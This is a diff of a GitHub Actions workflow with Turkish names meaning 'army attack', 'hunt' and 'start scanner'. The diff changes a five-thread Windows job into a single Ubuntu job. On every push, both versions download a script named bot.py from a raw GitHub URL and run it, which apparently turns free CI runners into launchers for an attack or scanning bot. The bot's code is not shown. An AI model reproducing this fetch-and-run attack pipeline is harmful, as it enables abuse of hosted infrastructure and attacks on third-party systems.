@@ -1,13 +1,11 @@
-name: Ordu_Saldirisi
-on: [push, workflow_dispatch]
+name: Tekli_Harekat
+on: [push]
 jobs:
-  scan:
-    runs-on: windows-latest
-    strategy:
-      matrix:
-        thread: [1, 2, 3, 4, 5]
+  hunt:
+    runs-on: ubuntu-latest
     steps:
-      - name: Tarayiciyi Baslat
+      - name: Baslat
         run: |
+          pip install requests
           curl -O https://raw.githubusercontent.com/HAYALETBEY437/ordu/main/bot.py
           python3 bot.py
